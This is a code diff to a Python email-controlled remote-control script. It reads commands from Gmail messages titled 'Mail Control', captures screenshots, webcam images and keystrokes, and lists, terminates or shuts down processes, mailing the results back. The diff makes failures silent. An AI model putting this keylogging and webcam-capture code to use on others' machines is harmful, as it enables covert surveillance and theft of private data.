@@ -12,30 +12,36 @@ class Mail:
         self.email_message: MIMEMultipart
 
     def fetch_mail(self):
-        # ? Login to the mail server and select the inbox
-        mail = imaplib.IMAP4_SSL("imap.gmail.com")
-        mail.login(USERNAME, APP_PASS)
-        mail.select("inbox")
+        try:
+            # ? Login to the mail server and select the inbox
+            mail = imaplib.IMAP4_SSL("imap.gmail.com")
+            mail.login(USERNAME, APP_PASS)
+            mail.select("inbox")
 
-        #! Get all the mail with subject "Mail Control"
-        *_, message = mail.search(None, '(UNSEEN SUBJECT "Mail Control")')
-        ids = message[0].split()
+            #! Get all the mail with subject "Mail Control"
+            *_, message = mail.search(None, '(UNSEEN SUBJECT "Mail Control")')
+            ids = message[0].split()
 
-        # ? Get the body of the mail
-        for id in ids:
-            *_, msg_data = mail.fetch(id, "(RFC822)")
-            email_body = email.message_from_bytes(msg_data[0][1])
-            self.sender, self.cmd_list = decode_mail(email_body)
+            # ? Get the body of the mail
+            for id in ids:
+                *_, msg_data = mail.fetch(id, "(RFC822)")
+                email_body = email.message_from_bytes(msg_data[0][1])
+                self.sender, self.cmd_list = decode_mail(email_body)
 
-        mail.logout()
+            mail.logout()
+        except:
+            pass
 
     def send_mail(self):
-        with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
-            smtp.starttls()
-            smtp.login(USERNAME, APP_PASS)
+        try:
+            with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
+                smtp.starttls()
+                smtp.login(USERNAME, APP_PASS)
 
-            smtp.sendmail(USERNAME, self.sender, self.email_message.as_string())
-            print("Mail sent to", self.sender)
+                smtp.sendmail(USERNAME, self.sender, self.email_message.as_string())
+                print("Mailed to", self.sender)
+        except:
+            pass
 
     def screenshot(self):
         file_name: str = "Picture.png"
@@ -55,26 +61,25 @@ class Mail:
                 picture_file.read(), name=os.path.basename(file_path)
             )
             self.email_message.attach(picture_attachment)
-    
+
     def webcam(self):
         file_name: str = "Webcam.png"
         try:
             file_name = self.cmd_list[1]
         except:
             pass
-        
+
         file_path, message = capture_webcam(file_name)
-         
+
         self.set_info("Webcam")
-        self.body = message
-        self.email_message.attach(MIMEText(self.body, "plain"))
-        
-        with open(file_path, 'rb') as picture_file:
+        self.email_message.attach(MIMEText(message, "plain"))
+
+        with open(file_path, "rb") as picture_file:
             picture_attachment = MIMEImage(
                 picture_file.read(), name=os.path.basename(file_path)
             )
-            self.email_message.attach(picture_attachment)       
-    
+            self.email_message.attach(picture_attachment)
+
     def keylogger(self):
         duration: int = 5
         try:
@@ -128,7 +133,7 @@ class Mail:
         self.set_info("List Applications")
         self.body = "The list of running applications of your PC."
         self.email_message.attach(MIMEText(self.body, "plain"))
-        
+
         with open(file_path, "r") as text_file:
             text_attachment = MIMEText(text_file.read())
             text_attachment.add_header(
@@ -177,19 +182,24 @@ class Mail:
 
     def process_command(self):
         command = {
-            "screenshot": self.screenshot,
-            "webcam": self.webcam,
-            "keylog": self.keylogger,
-            "logout": self.logout,
-            "shutdown": self.shutdown,
-            "listApp": self.list_app,
-            "listProcess": self.list_process,
-            "terminateProcess": self.terminate_process,
+            "screenshot": [self.screenshot, "perform capturing screenshot"],
+            "webcam": [self.webcam, "perform capturing from webcam"],
+            "keylog": [self.keylogger, "perform keylogging"],
+            "logout": [self.logout, "logout from your PC"],
+            "shutdown": [self.shutdown, "shutdown your PC"],
+            "listApp": [self.list_app, "list running applications"],
+            "listProcess": [self.list_process, "list running processes"],
+            "terminateProcess": [self.terminate_process, "terminate a process"],
             # "dir": None,
-            "log": self.log,
-            "help": self.help,
+            "log": [self.log, "get the log file of your PC"],
+            "help": [self.help, "get the list of commands"],
         }
-        command[self.cmd_list[0]]()
+        
+        if self.cmd_list[0] in command:
+            try:
+                command[self.cmd_list[0]][0]()
+            except Exception:
+                print(f"ERROR: Cannot {command[self.cmd_list[0]][1]}")
 
     def set_info(self, message: str):
         self.email_message = MIMEMultipart()
